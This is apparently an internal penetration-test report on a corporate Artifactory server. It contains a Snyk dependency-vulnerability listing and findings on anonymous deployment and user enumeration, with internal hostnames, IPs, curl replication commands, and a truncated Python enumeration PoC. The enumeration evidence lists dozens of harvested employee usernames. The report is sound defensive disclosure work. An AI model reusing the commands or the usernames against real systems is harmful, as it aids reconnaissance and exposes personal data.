  ‚úó Missing Release of Resource after Effective Lifetime [Medium Severity][https://security.snyk.io/vuln/SNYK-JS-INFLIGHT-6095116] in inflight@1.0.6
    introduced by js-beautify@1.14.4 > glob@7.2.3 > inflight@1.0.6 and 5 other path(s)
  ‚úó Reverse Tabnabbing [Medium Severity][https://security.snyk.io/vuln/SNYK-JS-ISTANBULREPORTS-2328088] in istanbul-reports@1.5.1
    introduced by @vue/cli-plugin-unit-jest@3.4.0 > jest@23.6.0 > jest-cli@23.6.0 > istanbul-api@1.3.7 > istanbul-reports@1.5.1
  ‚úó Prototype Pollution [Medium Severity][https://security.snyk.io/vuln/SNYK-JS-JSON5-3182856] in json5@0.5.1
    introduced by @vue/cli-service@3.2.0 > html-webpack-plugin@3.2.0 > loader-utils@0.2.17 > json5@0.5.1 and 1 other path(s)
  ‚úó Regular Expression Denial of Service (ReDoS) [Medium Severity][https://security.snyk.io/vuln/SNYK-JS-UGLIFYJS-1727251] in uglify-js@3.4.10
    introduced by html-loader@0.5.5 > html-minifier@3.5.21 > uglify-js@3.4.10 and 3 other path(s)
  ‚úó Prototype Pollution [Medium Severity][https://security.snyk.io/vuln/SNYK-JS-YARGSPARSER-560381] in yargs-parser@9.0.2
    introduced by @vue/cli-plugin-unit-jest@3.4.0 > jest@23.6.0 > jest-cli@23.6.0 > jest-runner@23.6.0 > jest-runtime@23.6.0 > yargs@11.1.1 > yargs-parser@9.0.2
  ‚úó Regular Expression Denial of Service (ReDoS) [High Severity][https://security.snyk.io/vuln/SNYK-JS-ANSIREGEX-1583908] in ansi-regex@2.1.1
    introduced by @vue/cli-plugin-eslint@3.2.0 > eslint@4.19.1 > babel-code-frame@6.26.0 > chalk@1.1.3 > has-ansi@2.0.0 > ansi-regex@2.1.1 and 7 other path(s)
  ‚úó Excessive Platform Resource Consumption within a Loop [High Severity][https://security.snyk.io/vuln/SNYK-JS-BRACES-6838727] in braces@2.3.2
    introduced by @vue/cli-plugin-eslint@3.2.0 > globby@8.0.2 > fast-glob@2.2.7 > micromatch@3.1.10 > braces@2.3.2 and 5 other path(s)
  ‚úó Prototype Pollution [High Severity][https://security.snyk.io/vuln/SNYK-JS-MERGE-1040469] in merge@1.2.1
    introduced by @vue/cli-plugin-unit-jest@3.4.0 > jest@23.6.0 > jest-cli@23.6.0 > jest-haste-map@23.6.0 > sane@2.5.2 > exec-sh@0.2.2 > merge@1.2.1
  ‚úó Prototype Pollution [High Severity][https://security.snyk.io/vuln/SNYK-JS-MERGE-1042987] in merge@1.2.1
    introduced by @vue/cli-plugin-unit-jest@3.4.0 > jest@23.6.0 > jest-cli@23.6.0 > jest-haste-map@23.6.0 > sane@2.5.2 > exec-sh@0.2.2 > merge@1.2.1
  ‚úó Inefficient Regular Expression Complexity [High Severity][https://security.snyk.io/vuln/SNYK-JS-MICROMATCH-6838728] in micromatch@3.1.10
    introduced by @vue/cli-service@3.2.0 > webpack@4.47.0 > micromatch@3.1.10 and 14 other path(s)
  ‚úó Prototype Pollution [High Severity][https://security.snyk.io/vuln/SNYK-JS-UNSETVALUE-2400660] in unset-value@1.0.0
    introduced by @vue/cli-plugin-eslint@3.2.0 > globby@8.0.2 > fast-glob@2.2.7 > micromatch@3.1.10 > braces@2.3.2 > snapdragon@0.8.2 > base@0.11.2 > cache-base@1.0.1 > unset-value@1.0.0 and 2 other path(s)
  ‚úó Incomplete List of Disallowed Inputs [Critical Severity][https://security.snyk.io/vuln/SNYK-JS-BABELTRAVERSE-5962463] in babel-traverse@6.26.0
    introduced by babel-jest@23.6.0 > babel-plugin-istanbul@4.1.6 > istanbul-lib-instrument@1.10.2 > babel-traverse@6.26.0 and 5 other path(s)

  Upgrade @vue/cli-service@3.2.0 to @vue/cli-service@5.0.1 to fix
  ‚úó Arbitrary Code Injection [Medium Severity][https://security.snyk.io/vuln/SNYK-JS-EJS-1049328] in ejs@2.7.4
    introduced by @vue/cli-service@3.2.0 > webpack-bundle-analyzer@3.9.0 > ejs@2.7.4
  ‚úó Improper Control of Dynamically-Managed Code Resources [Medium Severity][https://security.snyk.io/vuln/SNYK-JS-EJS-6689533] in ejs@2.7.4
    introduced by @vue/cli-service@3.2.0 > webpack-bundle-analyzer@3.9.0 > ejs@2.7.4
  ‚úó Regular Expression Denial of Service (ReDoS) [Medium Severity][https://security.snyk.io/vuln/SNYK-JS-GLOBPARENT-1016905] in glob-parent@3.1.0
    introduced by @vue/cli-plugin-eslint@3.2.0 > globby@8.0.2 > fast-glob@2.2.7 > glob-parent@3.1.0 and 2 other path(s)
  ‚úó Regular Expression Denial of Service (ReDoS) [Medium Severity][https://security.snyk.io/vuln/SNYK-JS-HTMLMINIFIER-3091181] in html-minifier@3.5.21
    introduced by html-loader@0.5.5 > html-minifier@3.5.21 and 2 other path(s)
  ‚úó Missing Release of Resource after Effective Lifetime [Medium Severity][https://security.snyk.io/vuln/SNYK-JS-INFLIGHT-6095116] in inflight@1.0.6
    introduced by js-beautify@1.14.4 > glob@7.2.3 > inflight@1.0.6 and 5 other path(s)
  ‚úó Server-Side Request Forgery (SSRF) [Medium Severity][https://security.snyk.io/vuln/SNYK-JS-IP-7148531] in ip@1.1.9
    introduced by @vue/cli-service@3.2.0 > webpack-dev-server@3.11.3 > ip@1.1.9 and 1 other path(s)
  ‚úó Open Redirect [Medium Severity][https://security.snyk.io/vuln/SNYK-JS-NODEFORGE-2330875] in node-forge@0.10.0
    introduced by @vue/cli-service@3.2.0 > webpack-dev-server@3.11.3 > selfsigned@1.10.14 > node-forge@0.10.0
  ‚úó Prototype Pollution [Medium Severity][https://security.snyk.io/vuln/SNYK-JS-NODEFORGE-2331908] in node-forge@0.10.0
    introduced by @vue/cli-service@3.2.0 > webpack-dev-server@3.11.3 > selfsigned@1.10.14 > node-forge@0.10.0
  ‚úó Regular Expression Denial of Service (ReDoS) [Medium Severity][https://security.snyk.io/vuln/SNYK-JS-POSTCSS-1255640] in postcss@6.0.23
    introduced by @vue/cli-service@3.2.0 > autoprefixer@8.6.5 > postcss@6.0.23 and 6 other path(s)
  ‚úó Improper Input Validation [Medium Severity][https://security.snyk.io/vuln/SNYK-JS-POSTCSS-5926692] in postcss@6.0.23
    introduced by @vue/cli-service@3.2.0 > autoprefixer@8.6.5 > postcss@6.0.23 and 41 other path(s)
  ‚úó Server-side Request Forgery (SSRF) [Medium Severity][https://security.snyk.io/vuln/SNYK-JS-REQUEST-3361831] in request@2.88.2
    introduced by less@3.8.1 > request@2.88.2 and 4 other path(s)
  ‚úó Prototype Pollution [Medium Severity][https://security.snyk.io/vuln/SNYK-JS-TOUGHCOOKIE-5672873] in tough-cookie@2.5.0
    introduced by less@3.8.1 > request@2.88.2 > tough-cookie@2.5.0 and 7 other path(s)
  ‚úó Regular Expression Denial of Service (ReDoS) [Medium Severity][https://security.snyk.io/vuln/SNYK-JS-UGLIFYJS-1727251] in uglify-js@3.4.10
    introduced by html-loader@0.5.5 > html-minifier@3.5.21 > uglify-js@3.4.10 and 3 other path(s)
  ‚úó Excessive Platform Resource Consumption within a Loop [High Severity][https://security.snyk.io/vuln/SNYK-JS-BRACES-6838727] in braces@2.3.2
    introduced by @vue/cli-plugin-eslint@3.2.0 > globby@8.0.2 > fast-glob@2.2.7 > micromatch@3.1.10 > braces@2.3.2 and 5 other path(s)
  ‚úó Remote Code Execution (RCE) [High Severity][https://security.snyk.io/vuln/SNYK-JS-EJS-2803307] in ejs@2.7.4
    introduced by @vue/cli-service@3.2.0 > webpack-bundle-analyzer@3.9.0 > ejs@2.7.4
  ‚úó Inefficient Regular Expression Complexity [High Severity][https://security.snyk.io/vuln/SNYK-JS-MICROMATCH-6838728] in micromatch@3.1.10
    introduced by @vue/cli-service@3.2.0 > webpack@4.47.0 > micromatch@3.1.10 and 14 other path(s)
  ‚úó Regular Expression Denial of Service (ReDoS) [High Severity][https://security.snyk.io/vuln/SNYK-JS-NTHCHECK-1586032] in nth-check@1.0.2
    introduced by @vue/cli-service@3.2.0 > @intervolga/optimize-cssnano-plugin@1.0.6 > cssnano@4.1.11 > cssnano-preset-default@4.0.8 > postcss-svgo@4.0.3 > svgo@1.3.2 > css-select@2.1.0 > nth-check@1.0.2
  ‚úó Arbitrary Code Injection [High Severity][https://security.snyk.io/vuln/SNYK-JS-SERIALIZEJAVASCRIPT-570062] in serialize-javascript@1.9.1
    introduced by @vue/cli-service@3.2.0 > copy-webpack-plugin@4.6.0 > serialize-javascript@1.9.1
  ‚úó Regular Expression Denial of Service (ReDoS) [High Severity][https://security.snyk.io/vuln/SNYK-JS-SSRI-1246392] in ssri@5.3.0
    introduced by @vue/cli-service@3.2.0 > copy-webpack-plugin@4.6.0 > cacache@10.0.4 > ssri@5.3.0
  ‚úó Prototype Pollution [High Severity][https://security.snyk.io/vuln/SNYK-JS-UNSETVALUE-2400660] in unset-value@1.0.0
    introduced by @vue/cli-plugin-eslint@3.2.0 > globby@8.0.2 > fast-glob@2.2.7 > micromatch@3.1.10 > braces@2.3.2 > snapdragon@0.8.2 > base@0.11.2 > cache-base@1.0.1 > unset-value@1.0.0 and 2 other path(s)
  ‚úó Cross-site Scripting (XSS) [High Severity][https://security.snyk.io/vuln/SNYK-JS-SERIALIZEJAVASCRIPT-536840] in serialize-javascript@1.9.1
    introduced by @vue/cli-service@3.2.0 > copy-webpack-plugin@4.6.0 > serialize-javascript@1.9.1
  ‚úó Cross-site Scripting (XSS) [High Severity][https://security.snyk.io/vuln/SNYK-JS-SERIALIZEJAVASCRIPT-6056521] in serialize-javascript@1.9.1
    introduced by @vue/cli-service@3.2.0 > copy-webpack-plugin@4.6.0 > serialize-javascript@1.9.1
  ‚úó Regular Expression Denial of Service (ReDoS) [High Severity][https://security.snyk.io/vuln/SNYK-JS-ANSIREGEX-1583908] in ansi-regex@2.1.1
    introduced by @vue/cli-plugin-eslint@3.2.0 > eslint@4.19.1 > babel-code-frame@6.26.0 > chalk@1.1.3 > has-ansi@2.0.0 > ansi-regex@2.1.1 and 7 other path(s)
  ‚úó Improper Verification of Cryptographic Signature [Critical Severity][https://security.snyk.io/vuln/SNYK-JS-ELLIPTIC-8187303] in elliptic@6.6.1
    introduced by @vue/cli-service@3.2.0 > webpack@4.47.0 > node-libs-browser@2.2.1 > crypto-browserify@3.12.1 > browserify-sign@4.2.3 > elliptic@6.6.1 and 1 other path(s)

  Upgrade axios@0.26.1 to axios@1.8.2 to fix
  ‚úó Server-side Request Forgery (SSRF) (new) [Medium Severity][https://security.snyk.io/vuln/SNYK-JS-AXIOS-9292519] in axios@0.26.1
    introduced by axios@0.26.1
  ‚úó Cross-site Scripting (XSS) [Medium Severity][https://security.snyk.io/vuln/SNYK-JS-AXIOS-6671926] in axios@0.26.1
    introduced by axios@0.26.1
  ‚úó Regular Expression Denial of Service (ReDoS) [Medium Severity][https://security.snyk.io/vuln/SNYK-JS-AXIOS-6124857] in axios@0.26.1
    introduced by axios@0.26.1
  ‚úó Cross-site Request Forgery (CSRF) [High Severity][https://security.snyk.io/vuln/SNYK-JS-AXIOS-6032459] in axios@0.26.1
    introduced by axios@0.26.1

  Upgrade babel-jest@23.6.0 to babel-jest@24.0.0 to fix
  ‚úó Regular Expression Denial of Service (ReDoS) [High Severity][https://security.snyk.io/vuln/SNYK-JS-ANSIREGEX-1583908] in ansi-regex@2.1.1
    introduced by @vue/cli-plugin-eslint@3.2.0 > eslint@4.19.1 > babel-code-frame@6.26.0 > chalk@1.1.3 > has-ansi@2.0.0 > ansi-regex@2.1.1 and 7 other path(s)
  ‚úó Excessive Platform Resource Consumption within a Loop [High Severity][https://security.snyk.io/vuln/SNYK-JS-BRACES-6838727] in braces@2.3.2
    introduced by @vue/cli-plugin-eslint@3.2.0 > globby@8.0.2 > fast-glob@2.2.7 > micromatch@3.1.10 > braces@2.3.2 and 5 other path(s)
  ‚úó Inefficient Regular Expression Complexity [High Severity][https://security.snyk.io/vuln/SNYK-JS-MICROMATCH-6838728] in micromatch@3.1.10
    introduced by @vue/cli-service@3.2.0 > webpack@4.47.0 > micromatch@3.1.10 and 14 other path(s)
  ‚úó Incomplete List of Disallowed Inputs [Critical Severity][https://security.snyk.io/vuln/SNYK-JS-BABELTRAVERSE-5962463] in babel-traverse@6.26.0
    introduced by babel-jest@23.6.0 > babel-plugin-istanbul@4.1.6 > istanbul-lib-instrument@1.10.2 > babel-traverse@6.26.0 and 5 other path(s)

  Upgrade billboard.js@1.9.5 to billboard.js@1.11.0 to fix
  ‚úó Regular Expression Denial of Service (ReDoS) [Medium Severity][https://security.snyk.io/vuln/SNYK-JS-D3COLOR-1076592] in d3-color@1.4.1
    introduced by billboard.js@1.9.5 > d3@5.16.0 > d3-color@1.4.1 and 3 other path(s)

  Upgrade bootstrap@4.3.1 to bootstrap@5.0.0 to fix
  ‚úó Cross-site Scripting (XSS) [Medium Severity][https://security.snyk.io/vuln/SNYK-JS-BOOTSTRAP-7444580] in bootstrap@4.3.1
    introduced by bootstrap@4.3.1 and 1 other path(s)
  ‚úó Cross-site Scripting (XSS) [Medium Severity][https://security.snyk.io/vuln/SNYK-JS-BOOTSTRAP-7444593] in bootstrap@4.3.1
    introduced by bootstrap@4.3.1 and 1 other path(s)

  Upgrade dompurify@2.3.8 to dompurify@2.5.4 to fix
  ‚úó Cross-site Scripting (XSS) [Medium Severity][https://security.snyk.io/vuln/SNYK-JS-DOMPURIFY-8184974] in dompurify@2.3.8
    introduced by dompurify@2.3.8
  ‚úó Template Injection [Medium Severity][https://security.snyk.io/vuln/SNYK-JS-DOMPURIFY-6474511] in dompurify@2.3.8
    introduced by dompurify@2.3.8
  ‚úó Prototype Pollution [High Severity][https://security.snyk.io/vuln/SNYK-JS-DOMPURIFY-7984421] in dompurify@2.3.8
    introduced by dompurify@2.3.8
  ‚úó Prototype Pollution [Critical Severity][https://security.snyk.io/vuln/SNYK-JS-DOMPURIFY-8318045] in dompurify@2.3.8
    introduced by dompurify@2.3.8

  Upgrade eslint@5.8.0 to eslint@9.0.0 to fix
  ‚úó Missing Release of Resource after Effective Lifetime [Medium Severity][https://security.snyk.io/vuln/SNYK-JS-INFLIGHT-6095116] in inflight@1.0.6
    introduced by js-beautify@1.14.4 > glob@7.2.3 > inflight@1.0.6 and 5 other path(s)

  Upgrade html-loader@0.5.5 to html-loader@1.0.0 to fix
  ‚úó Regular Expression Denial of Service (ReDoS) [Medium Severity][https://security.snyk.io/vuln/SNYK-JS-HTMLMINIFIER-3091181] in html-minifier@3.5.21
    introduced by html-loader@0.5.5 > html-minifier@3.5.21 and 2 other path(s)
  ‚úó Regular Expression Denial of Service (ReDoS) [Medium Severity][https://security.snyk.io/vuln/SNYK-JS-UGLIFYJS-1727251] in uglify-js@3.4.10
    introduced by html-loader@0.5.5 > html-minifier@3.5.21 > uglify-js@3.4.10 and 3 other path(s)

  Upgrade js-beautify@1.14.4 to js-beautify@1.14.10 to fix
  ‚úó Missing Release of Resource after Effective Lifetime [Medium Severity][https://security.snyk.io/vuln/SNYK-JS-INFLIGHT-6095116] in inflight@1.0.6
    introduced by js-beautify@1.14.4 > glob@7.2.3 > inflight@1.0.6 and 5 other path(s)

  Upgrade less@3.8.1 to less@3.12.0 to fix
  ‚úó Server-side Request Forgery (SSRF) [Medium Severity][https://security.snyk.io/vuln/SNYK-JS-REQUEST-3361831] in request@2.88.2
    introduced by less@3.8.1 > request@2.88.2 and 4 other path(s)
  ‚úó Prototype Pollution [Medium Severity][https://security.snyk.io/vuln/SNYK-JS-TOUGHCOOKIE-5672873] in tough-cookie@2.5.0
    introduced by less@3.8.1 > request@2.88.2 > tough-cookie@2.5.0 and 7 other path(s)

  Upgrade nodemon@2.0.12 to nodemon@2.0.19 to fix
  ‚úó Open Redirect [Medium Severity][https://security.snyk.io/vuln/SNYK-JS-GOT-2932019] in got@9.6.0
    introduced by nodemon@2.0.12 > update-notifier@4.1.3 > latest-version@5.1.0 > package-json@6.5.0 > got@9.6.0


Issues with no direct upgrade or patch:
  ‚úó Regular Expression Denial of Service (ReDoS) [Medium Severity][https://security.snyk.io/vuln/SNYK-JS-BROWSERSLIST-1090194] in browserslist@3.2.8
    introduced by @vue/cli-service@3.2.0 > autoprefixer@8.6.5 > browserslist@3.2.8
  This issue was fixed in versions: 4.16.5
  ‚úó Denial of Service (DoS) [High Severity][https://security.snyk.io/vuln/SNYK-JS-HTTPPROXYMIDDLEWARE-8229906] in http-proxy-middleware@0.19.1
    introduced by @vue/cli-service@3.2.0 > webpack-dev-server@3.11.3 > http-proxy-middleware@0.19.1
  This issue was fixed in versions: 2.0.7, 3.0.3
  ‚úó Regular Expression Denial of Service (ReDoS) [Medium Severity][https://security.snyk.io/vuln/SNYK-JS-LOADERUTILS-3042992] in loader-utils@0.2.17
    introduced by @vue/cli-service@3.2.0 > html-webpack-plugin@3.2.0 > loader-utils@0.2.17
  This issue was fixed in versions: 1.4.2, 2.0.4, 3.2.1
  ‚úó Prototype Pollution [High Severity][https://security.snyk.io/vuln/SNYK-JS-LOADERUTILS-3043105] in loader-utils@0.2.17
    introduced by @vue/cli-service@3.2.0 > html-webpack-plugin@3.2.0 > loader-utils@0.2.17
  This issue was fixed in versions: 1.4.1, 2.0.3
  ‚úó Regular Expression Denial of Service (ReDoS) [Medium Severity][https://security.snyk.io/vuln/SNYK-JS-LOADERUTILS-3105943] in loader-utils@0.2.17
    introduced by @vue/cli-service@3.2.0 > html-webpack-plugin@3.2.0 > loader-utils@0.2.17
  This issue was fixed in versions: 1.4.2, 2.0.4, 3.2.1
  ‚úó Improper Verification of Cryptographic Signature [Medium Severity][https://security.snyk.io/vuln/SNYK-JS-NODEFORGE-2430337] in node-forge@0.10.0
    introduced by @vue/cli-service@3.2.0 > webpack-dev-server@3.11.3 > selfsigned@1.10.14 > node-forge@0.10.0
  This issue was fixed in versions: 1.3.0
  ‚úó Improper Verification of Cryptographic Signature [High Severity][https://security.snyk.io/vuln/SNYK-JS-NODEFORGE-2430339] in node-forge@0.10.0
    introduced by @vue/cli-service@3.2.0 > webpack-dev-server@3.11.3 > selfsigned@1.10.14 > node-forge@0.10.0
  This issue was fixed in versions: 1.3.0
  ‚úó Improper Verification of Cryptographic Signature [Medium Severity][https://security.snyk.io/vuln/SNYK-JS-NODEFORGE-2430341] in node-forge@0.10.0
    introduced by @vue/cli-service@3.2.0 > webpack-dev-server@3.11.3 > selfsigned@1.10.14 > node-forge@0.10.0
  This issue was fixed in versions: 1.3.0
  ‚úó Regular Expression Denial of Service (ReDoS) [Medium Severity][https://security.snyk.io/vuln/SNYK-JS-PROMPTS-1729737] in prompts@0.1.14
    introduced by @vue/cli-plugin-unit-jest@3.4.0 > jest@23.6.0 > jest-cli@23.6.0 > prompts@0.1.14
  This issue was fixed in versions: 2.4.2
  ‚úó Cross-site Scripting (XSS) [Medium Severity][https://security.snyk.io/vuln/SNYK-JS-SERIALIZEJAVASCRIPT-6147607] in serialize-javascript@4.0.0
    introduced by @vue/cli-service@3.2.0 > copy-webpack-plugin@4.6.0 > serialize-javascript@1.9.1 and 1 other path(s)
  This issue was fixed in versions: 6.0.2
  ‚úó Cross-site Scripting (XSS) [Medium Severity][https://security.snyk.io/vuln/SNYK-JS-VUETEMPLATECOMPILER-7554675] in vue-template-compiler@2.5.17
    introduced by vue-template-compiler@2.5.17
  No upgrade or patch available
  ‚úó Cross-site Scripting (XSS) [Medium Severity][https://security.snyk.io/vuln/SNYK-JS-WEBPACK-7840298] in webpack@4.47.0
    introduced by @vue/cli-service@3.2.0 > webpack@4.47.0
  This issue was fixed in versions: 5.94.0
  ‚úó Path Traversal [High Severity][https://security.snyk.io/vuln/SNYK-JS-WEBPACKDEVMIDDLEWARE-6476555] in webpack-dev-middleware@3.7.3
    introduced by @vue/cli-service@3.2.0 > webpack-dev-server@3.11.3 > webpack-dev-middleware@3.7.3
  This issue was fixed in versions: 5.3.4, 6.1.2, 7.1.0



Organization:      gbiagomba
Package manager:   npm
Target file:       npm-security-check/package-lock.json
Project name:      npm-security-check
Open source:       no
Project path:      /Users/gbiagomba/Projects/Threat Model Artifactory Access/src
Licenses:          enabled

```

# Replicate Finding:
1. Visit the impacted URL in your web browser
2. Run the following command: `curl -kLs "https://artifactory.corp.adobe.com/ui/externals/jfrog-ui-essentials/dist/jfrog-ui-essentials.umd.min.js"`

# Mitigation/Remediation:
We recommend the following:
1. **Update NPM Packages**: Ensure all NPM packages are updated to their latest versions. For example, update `axios` to a version that addresses the XSS and ReDoS vulnerabilities.

```bash
   npm install axios@latest # Repeat for all impacted packages
```

2. **Implement Input Validation**: Use robust input validation to prevent XSS and ReDoS attacks. Ensure that all user inputs are properly sanitized.
3. **Regular Audits**: Conduct regular security audits of the dependencies used in Artifactory to identify and address any new vulnerabilities.
4. **Restrict Network Access**: Limit access to Artifactory to only trusted network segments and ensure that VPN access is secured with strong authentication mechanisms.

**Be advised, the above patch should be applied to all other system(s) running the impacted software that are managed by the team.**

# References:
1. https://inside.corp.adobe.com/content/dam/corporate-policies/documents/Patch-Management-Standard.pdf
2. https://inside.corp.adobe.com/content/dam/corporate-policies/documents/Source_Code_Security_Standard.pdf
3. https://inside.corp.adobe.com/content/dam/corporate-policies/documents/Secure-Product-Lifecycle-Standard.pdf
4. [JFrog Security Advisories](https://jfrog.com/help/r/jfrog-release-information/jfrog-security-advisories)


---
# File: /Users/gbiagomba/Documents/Adobe/Security Assessments/Threat Model Artifactory Access/Findings/Submitted/Artifactory Access - Artifactory Anonymous Deployment - High (8.8).md
---

# Risk: High (8.8)
**CVSS:3.1**`AV:A/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H`

**Explanation:**
- **Attack Vector (AV:A)**: Adjacent. The attacker needs to be on the VPN.
- **Attack Complexity (AC:L)**: Low. No special conditions or access to systems are required.
- **Privileges Required (PR:N)**: None. Some limited privileges, such as anonymous user access to repository deployment, are required.
- **User Interaction (UI:N)**: No user interaction is needed for exploitation.
- **Scope (S:U)**: Unchanged. The exploited vulnerability affects only the vulnerable component.
- **Confidentiality Impact (C:H)**: High. An attacker can access sensitive data.
- **Integrity Impact (I:H)**: High. An attacker can alter the repository contents.
- **Availability Impact (A:H)**: High. Malicious files can disrupt the availability of services.

Based on the risk, the SLA to fix the ticket is **N** days. The team must fix this issue by **DATE**, per Adobe's[Vulnerability Management Standard](https://inside.corp.adobe.com/content/dam/corporate-policies/documents/Vulnerability-Management-Standard.pdf#page=2)

# Description:
While performing a security assessment of `Artifactory`, we observed the noted web app had allowed anonymous users to uploaded code to the platform. Allowing anonymous users to deploy files to a repository in **Artifactory** presents a significant security risk. By allowing anonymous access, attackers could upload malicious artifacts such as backdoored binaries, malware, or unauthorized code. This could lead to the distribution of compromised components across an organization or even the wider development ecosystem, exposing downstream users to security risks.

# Impact:
If attackers leverage the ability to deploy files as anonymous users, they could introduce malicious artifacts into critical repositories. This could compromise the integrity of the software supply chain, resulting in widespread exploitation. Attackers could upload malicious code disguised as legitimate software updates, inject backdoors, or disrupt system operations by causing services dependent on the repository to consume malicious artifacts. This could result in:
- Data breaches by injecting trojan code.
- Compromised software builds leading to unauthorized access.
- Denial of service if malicious binaries crash dependent applications.

# Affected Assets:
## Affected Host(s):
- 10.40.102.10 (artifactory-no1.corp.adobe.com) [443/tcp]

# Evidence:
## Request
```
GET /artifactory/ui/repodata?deploy=true HTTP/1.1
Host: artifactory.corp.adobe.com
Accept: */*
Accept-Language: en
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.0.0 Safari/537.36 Edg/118.0.2088.46
Connection: keep-alive
```

## Response
```
HTTP/1.1 200 OK
Date: Mon, 16 Sep 2024 20:00:19 GMT
Content-Type: application/json
Connection: keep-alive
X-JFrog-Version: Artifactory/7.63.21 76321900
X-Artifactory-Id: 095d6c039c985b29af09053ab1cbc068786681c8
X-Artifactory-Node-Id: or1dra936.corp.adobe.com
Access-Control-Allow-Methods: GET, POST, DELETE, PUT
Access-Control-Allow-Headers: X-Requested-With, Content-Type, X-Codingpedia
Cache-Control: no-store
SessionValid: false
Content-Length: 978

{"repoTypesList":[{"repoKey":"pypi-gentech-tools-release-local","repoType":"Pypi","layoutPattern":"[orgPath]/[module]/[module]-[baseRev].[ext]","layoutFolderItegRevRegex":".*","layoutFileItegRevRegex":".*"},{"repoKey":"pypi-gentech-tools-release-no1","repoType":"Pypi","layoutPattern":"[orgPath]/[module]/[module]-[baseRev].[ext]","layoutFolderItegRevRegex":".*","layoutFileItegRevRegex":".*"},{"repoKey":"pypi-gentech-tools-release-or1","repoType":"Pypi","layoutPattern":"[orgPath]/[module]/[module]-[baseRev].[ext]","layoutFolderItegRevRegex":".*","layoutFileItegRevRegex":".*"},{"repoKey":"pypi-gentech-tools-release-sj1","repoType":"Pypi","layoutPattern":"[orgPath]/[module]/[module]-[baseRev].[ext]","layoutFolderItegRevRegex":".*","layoutFileItegRevRegex":".*"},{"repoKey":"pypi-gentech-tools-release","repoType":"Pypi","layoutPattern":"[orgPath]/[module]/[module]-[baseRev].[ext]","layoutFolderItegRevRegex":".*","layoutFileItegRevRegex":".*"}],"fileUploadMaxSizeMb":500}
```

# Replicate Finding:
Run the following command: `curl -kLs -H 'Accept: */*' -H 'Accept-Language: en' -H 'User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.0.0 Safari/537.36 Edg/118.0.2088.46' 'https://artifactory.corp.adobe.com/artifactory/ui/repodata?deploy=true' | jq`

# Mitigation/Remediation:
We recommend disabling anonymous deployments in Artifactory. Configure the repository permissions to restrict file deployment only to authenticated users with appropriate roles.

**Sample configuration:**
1. Disable anonymous access:
   ```bash
   artifactory.security.allowAnonymous=false
   ```
2. Define user roles for repository deployment:
   ```bash
   # Assign roles to users
   artifactory.security.permissions.repoDeploy = "developers,devops"
   ```
3. Use repository access tokens for automated deployments instead of allowing any user to deploy without authentication.

**Additional Mitigation:**
- Enable logging and monitoring of repository activity to detect unusual uploads.
- Implement signed artifacts and enforce artifact validation to ensure their integrity before deployment.

For more information & context, please see the reference section below.

**Please ensure that the above patch is applied to all other services, applications, and/or systems running the affected software that are managed by the team.**

# References:
1. https://inside.corp.adobe.com/content/dam/corporate-policies/documents/Patch-Management-Standard.pdf
2. https://inside.corp.adobe.com/content/dam/corporate-policies/documents/Network-Security-Standard.pdf
3. https://owasp.org/www-project-developer-guide/draft/foundations/secure_development/
4. https://owasp.org/www-project-integration-standards/writeups/owasp_in_sdlc/
5. https://owasp.org/www-project-mobile-top-10/2023-risks/m3-insecure-authentication-authorization
6. https://owasp.org/Top10/A07_2021-Identification_and_Authentication_Failures/
7. https://cwe.mitre.org/data/definitions/732.html


---
# File: /Users/gbiagomba/Documents/Adobe/Security Assessments/Threat Model Artifactory Access/Findings/Submitted/Artifactory Access - Artifactory User Enumeration Vulnerability - Medium (6.5).md
---

# Risk: Medium (6.5)
**CVSS:3.1**`/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:L/A:N`

**Explanation**:  
This vulnerability allows an anonymous attacker to enumerate users by leveraging the "Deployed By" value of artifacts in Artifactory. The attack is possible over the network (AV:N), with no special access or privileges required (PR:N), and does not need user interaction (UI:N). The complexity of the attack is low (AC:L), and the scope remains unchanged (S:U) because it only affects the confidentiality and integrity of user information. The potential disclosure of usernames or identifiable information results in a low impact on confidentiality (C:L), and similarly, the ability to list users may allow for low integrity impact (I:L). There is no direct effect on availability (A:N).

Based on the risk, the SLA to fix the ticket is **N** days. The team must fix this issue by **DATE**, per Adobe's[Vulnerability Management Standard](https://inside.corp.adobe.com/content/dam/corporate-policies/documents/Vulnerability-Management-Standard.pdf#page=2)

# Description:
While performing a security assessment of `Artifactory`, we observed the noted web app had user enumration vulnerability. Specifically, the Artifactory instance allowed an anonimous user to enumarate users on the instance. In Artifactory, the ability to list users is restricted to administrative roles. However, by exploiting the "Deployed By" value attached to artifacts, an anonymous user can enumerate active users who have deployed artifacts. This loophole allows for the disclosure of sensitive information that could lead to user profiling and potentially pave the way for more advanced attacks like credential stuffing or targeted phishing.

# Impact:
If an attacker leverages this vulnerability, they can gather a list of active users deploying artifacts. This information can be used to mount follow-up attacks, such as spear-phishing or brute-force attempts against these users. In particular, knowledge of the usernames or deployment accounts can assist attackers in narrowing down their targets, gaining further access, or impersonating these users for malicious actions like unauthorized deployments. Additionally, exposure of user activity might breach internal confidentiality policies and give adversaries an advantage when conducting internal reconnaissance.

# Affected Assets:
## Affected Host(s):
- 10.50.227.144 (or1dra824.corp.adobe.com) [443/tcp]

# Evidence:
```
There are 1274 repositories to process
Found user naprice
Found user _system_
Found user all43103
Found user scmutl
Found user klein
Found user edropgeneric
Found user ajeng
Found user ram
Found user psftp
Found user vpaul
Found user parshev
Found user jsisson
Found user asiruwa
Found user tsackett
Found user mgummadam
Found user sgooch
Found user jwiltse
Found user duran
Found user kwright
Found user wyles
Found user jhall
Found user demeeste
Found user zolesio
Found user barmand
Found user kanikgup
Found user jespuser
Found user briard
Found user mendezac
Found user emittal
Found user rpmbldr
Found user madhgupt
Found user aaagrawa
Found user aeartif
Found user amorgen
Found user vpotapye
Found user amitg
Found user jgjerde
Found user davkaur
Found user irmina
Found user dimfeld
Found user sakhande
Found user gauntlet
Found user insuafer
Found user volteanu
Found user kpatters
Found user agutierr
Found user uploader
Found user vitrano
Found user piejnkns
Found user bgardner
```

# Replicate Finding:
1. Save the following PoC:
```python
#!/usr/bin/env python3
import requests
import json
import urllib3
import sys

# SUPPRESS WARNINGS ############################################################
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

# ADD USER #####################################################################
def check_users(details):
    global users
    if 'createdBy' not in details:
        return

